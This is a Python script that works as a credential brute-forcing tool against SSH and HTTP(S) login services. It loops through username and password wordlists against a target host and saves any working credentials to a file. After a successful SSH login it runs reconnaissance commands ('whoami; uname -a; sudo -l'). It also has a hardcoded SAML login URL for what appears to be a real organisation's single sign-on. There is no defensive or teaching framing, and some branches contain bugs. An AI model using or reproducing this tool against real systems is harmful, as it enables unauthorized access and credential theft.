# Wesh la Street

import argparse
import shlex
import subprocess
import socket
import time
import twill

from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException


class bruteForce:

    def __init__(self, host, protocol):
        self.host = host
        self.protocol = protocol
        try:
            ping = self.ping_host()
            if ping is False:
                raise Exception('[ERROR] Cannot bruteforce a dead host')
            open_port = self.open_port_host()
            if open_port is False:
                print("[ERROR] Cannot bruteforce on a closed port")
                exit(1)
        except Exception as e:
            raise 

    def ping_host(self):
        """Just a ping to test if the host is alive"""
        run = subprocess.run(shlex.split(f'ping {self.host} -c 1'), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if run.returncode == 0:
            print(f'The host {self.host} is alive')
            return True
        return False

    def open_port_host(self):
        self.port = 80 if self.protocol == 'http' else 443 if self.protocol == 'https' else 22 if self.protocol == 'ssh' else None
        if self.port is None:
            raise Exception("[ERROR] The protocol you specified is not a valid protocol. \nPlease read the help documention with python3 bruteforce.py -h ")
        a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        victim = (self.host, self.port)
        check = a_socket.connect_ex(victim)
        if check != 0:
            print(f">> Port {self.port} is closed")
            return False
        print(f'>> Port {self.port} is open !')
        return True

    def ssh_bruteforce(self, user, password):
        ssh_client = SSHClient()
        ssh_client.set_missing_host_key_policy(AutoAddPolicy()) # Setup know host
        try:
            ssh_client.connect(hostname=self.host, username=user, password=password, timeout=3)
        except socket.timeout:
            print(f'[ERROR] : Host {self.host} taken too much time to respond.')
        except AuthenticationException as ae:
            print(f'[ERROR] : Invalid credentials {user}:{password}\n', ae)
        except SSHException:
            print('[WARNING SSH connection] : Too much request send ! \n>> Waiting 10 seconds.')
            time.sleep(10)
            return self.ssh_bruteforce(user, password)
        else:
            print(f'[Suceeded] : Found credentials {user}:{password}')
            command = 'whoami; uname -a; sudo -l'
            (stdin, stdout, stderr) = ssh_client.exec_command(command)
            machine_info = list(stdout.readlines())
            machine_info_err = list(stderr.readlines())
            print(f"Command: {command} \nInput: {stdin} \nOutput: {machine_info} \nError: {machine_info_err}")
            return True

def ssh_parse_args(args, bruteforce):
    if args.userlist is not None and args.passlist is not None:
        users = open(args.userlist).read().splitlines()
        passwords = open(args.passlist).read().splitlines()

        for user in users:
            for password in passwords:
                if bruteforce.ssh_bruteforce(user.strip(), password.strip()):
                    open("ssh_credentials.txt", "a").write(f"{user}@{args.host}:{password}\n")
                    break

    if args.userlist is not None and args.password:
        users = open(args.userlist).read().splitlines()

        for user in users:
            if bruteforce.ssh_bruteforce(user, args.password):
                open("ssh_credentials.txt", "a").write(f"{user}@{args.host}:{password}\n")
                break

    if (
        args.username is not None
        and args.password is not None
        and bruteforce.ssh_bruteforce(args.username, args.password)
    ):
        open("ssh_credentials.txt", "a").write(f"{user}@{args.host}:{password}\n")

    if args.username is not None and args.passlist is not None:
        passwords = open(args.passlist).read().splitlines()

        for password in passwords:
            if bruteforce.ssh_bruteforce(args.username, password):
                open("ssh_credentials.txt", "a").write(f"{user}@{args.host}:{password}\n")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="The host you want to attack", )
    parser.add_argument("protocol", help="The protocol you want to attack. (HTTP/HTTPS or SSH", type=str)
    parser.add_argument("-u", "--username", help="Unique username for bruteforce purposes", default=None)
    parser.add_argument("-U", "--userlist", help="List of unique username for bruteforce purposes", default=None)
    parser.add_argument("-p", "--password", help="Unique password for bruteforce purposes", default=None)
    parser.add_argument("-P", "--passlist",help="List of unique password for bruteforce purposes", default=None)
    args = parser.parse_args()
    if args.protocol not in ['http', 'https', 'ssh']:
        print(f'The protocol {args.protocol} that you want to attack is not supported by the script.')

    if args.username is not None and args.userlist is not None:
        print("Can't have both username and userlist specified")
        exit(1)
    if args.password is not None and args.passlist is not None:
        print("Can't have both password and passlist specified")
        exit(1)  

    bruteforce = bruteForce(args.host, args.protocol)
    if args.protocol == 'ssh':
        ssh_parse_args(args, bruteforce)
    if args.protocol in ['http', 'https']:
        url = 'https://my.awoui.com/auth/realms/awoui/protocol/saml?SAMLRequest=fZJdT8IwGIX%2FytL7rd0GBBogQYiRBHUR9MIbUkonTfqBfVsn%2F94yRPFCLnt6Tvuctx0C02pPJ8HvzJN4DwJ88qmVAdpujFBwhloGEqhhWgD1nC4n9wtaZITunfWWW4UuItcTDEA4L61ByXw2Qut%2Bh%2FR6ZbdIu4R10k4heumgJjzdDEpRbHlel90OSl6Eg5gZoXhEDAIEMTfgmfFRIkWRkiLNe6u8pIRQkmfdfv8VJbPYRRrm2%2BTO%2Bz1QjPUhY40NMuNWYxZbYyeY0oBbFZ8b4WMVlFTfyxtpttK8Xe%2B2OZmA3q1WVVo9LlcomZz7Tq2BoIVbCvchuXh%2BWvwyNU1zAbWug%2BHHSGT6mdZ4eASibXU3bs1DfCkNT%2B%2F4EKnms8oqyQ%2FJrXWa%2Bf%2Bh8yxvFblN69ZKg4G94LKWYhvZlbLNNI7HixGqmQKB8Ph0698PM%2F4C&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=jG1AHcmOtybukvZOvvwLqsWUa%2FbCQdyQsRJwRJWDIH%2BInntk005xXXxxSrxgsFSI3t8HCmuqluEIlxDUaZwy3z6Q39cpkI%2FUfmQIndibTKyveWMrBD9evelGLV3n%2F8zQ19EqrNxhxZYfWvYgahHv60sbjys1Cd5YrQkGjTaq8skZSw1a3yTbACZOb%2BDrEy3u1e2xGIs6caw7VoI84zbR%2F%2BT6E7NreoEHVriF5eVYWd53h7fplq9JvbJgwep9xZnN1gxtky8Rr8cdsawvFNeN8obhceqsKp58AlFZjJt%2BrQ3irH5Sk6bKlC103VzCvfbqs1cgu58RP3UKWPjQv42uRQ%3D%3D'
        twill_cmd = twill.commands
        twill_cmd.go(url)
        twill_cmd.formvalue('1', 'username', args.username)
        twill_cmd.formvalue('1', 'password', args.password)
        twill_cmd.showforms()
        twill_cmd.submit('5')
        twill_cmd.info()